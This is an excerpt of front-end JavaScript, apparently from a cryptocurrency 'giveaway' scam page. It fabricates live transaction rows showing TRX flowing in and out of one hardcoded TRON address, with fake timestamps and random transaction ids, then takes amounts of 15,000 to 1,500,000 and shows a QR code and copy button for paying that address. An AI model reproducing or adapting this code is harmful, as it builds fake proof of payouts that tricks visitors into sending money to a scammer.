...
function create_transaction(mins) {
  ...
  row.innerHTML =
    ...
    address +
    '</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">TB3ydRXqYExiYW8rFJxb1VVRu2uhYF8c6s</span> </td> <td>' +
  ...
  row.innerHTML =
    ...
    '</a></td> <td><span class="timer">' +
    mins +
    ' mins ago</span></td> <td><span class="hash-tag text-truncate">TB3ydRXqYExiYW8rFJxb1VVRu2uhYF8c6s</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="">' +
    address +
    "</a> </td> <td>" +
  ...
  ;(row.innerHTML =
    ...
    setTimeout(() => {
      ...
      (row.innerHTML =
        ...
        '</a> </td> <td class="d-none d-sm-table-cell"><a href="">4' +
        tx(99999999) +
        '</a></td> <td><span class="timer" >now</span></td> <td><span class="hash-tag text-truncate">TB3ydRXqYExiYW8rFJxb1VVRu2uhYF8c6s</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="">' +
        address +
        "</a> </td> <td>" +
        send_amount.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",") +
        ' TRX</td> <td><span class="small text-secondary">0<b>.</b>000' +
...
;(get_random = function (
  ...
  $('#gen-btn').click(() => {
    if ($('#cal-in').val() >= 15000 && $('#cal-in').val() <= 1500000) {
      ...
      $("#qrcode_svg").attr(
        "src",
        "https://api.qrserver.com/v1/create-qr-code/?data=TB3ydRXqYExiYW8rFJxb1VVRu2uhYF8c6s&size=150x150"
      );
      // $('#paynow')
      //   .parent()
      //   .attr(
      //     'href',
      //     'tron:TB3ydRXqYExiYW8rFJxb1VVRu2uhYF8c6s?amount=' +
      //       amount_entered +
...
$('#copy_address').click(() => {
  $('#copy_address').attr(
    'data-clipboard-text',
    'TB3ydRXqYExiYW8rFJxb1VVRu2uhYF8c6s',
  )
